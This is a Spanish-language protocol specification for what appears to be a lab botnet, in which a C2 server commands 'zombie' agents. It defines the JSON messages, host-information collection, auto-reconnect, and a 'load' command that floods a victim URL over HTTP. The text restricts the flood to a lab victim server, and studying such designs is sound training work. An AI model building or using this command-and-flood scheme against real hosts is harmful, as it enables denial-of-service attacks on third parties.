# Protocolo C2 (servidor <-> agente)

Transporte: TCP. Cada mensaje es una linea de texto UTF-8 con un objeto JSON,
terminada en `\n`. Tamano maximo por mensaje: 64 KB.

## Agente -> Servidor

### hello (obligatorio al conectar)

```json
{"type":"hello","agent_id":"zombie-01","hostname":"PC-LAB","os":"Windows 11","user":"maria","version":"0.1","secret":"<C2_SHARED_SECRET>"}
```

Si el servidor tiene configurado `C2_SHARED_SECRET`, el campo `secret` debe coincidir
o la conexion se rechaza.

### heartbeat (cada 10 s, opcional)

```json
{"type":"heartbeat","ts":1730000000.0}
```

### result (respuesta a un comando)

```json
{"type":"result","id":"a1b2c3d4","status":"ok","data":{"pong":true}}
```

`id` debe copiar el identificador recibido en el comando. `status` es `ok` o `error`.

## Servidor -> Agente

### command

```json
{"type":"command","id":"a1b2c3d4","name":"ping","args":{}}
```

### command load (inundacion controlada)

```json
{"type":"command","id":"a1b2c3d4","name":"load","args":{"target":"http://IP_VICTIMA","duration":30,"concurrency":20}}
```

Restricciones del agente de prueba: solo `http://`, `duration` <= 120 s y
`concurrency` <= 200 por agente. Debe usarse unicamente contra el servidor
victima del laboratorio.

## Comandos del agente de prueba

| Comando | Args | Respuesta | Estado |
|---|---|---|---|
| ping | - | `{"pong": true}` | implementado |
| info | - | datos del sistema (hostname, SO, usuario, version de Python, CPUs) | implementado |
| echo | text | el mismo texto | implementado |
| stop | - | el agente termina su ejecucion | implementado |
| load | target, duration, concurrency | `{"sent": n, "errors": m, "rps": r, "duration_s": d}` | implementado |

## Notas de integracion

- El agente final (otro integrante) debe implementar `hello`, `heartbeat` y `result`
  con este formato para integrarse con el servidor.
- Recomendado: reconexion automatica con espera (por ejemplo cada 5 s) y
  `heartbeat` cada 10 s, para que los zombies sigan conectados si el C2 se
  reinicia (el servidor reemplaza la conexion anterior del mismo `agent_id`).
- Cualquier mensaje cuyo `type` no se reconozca se ignora (queda en el registro).
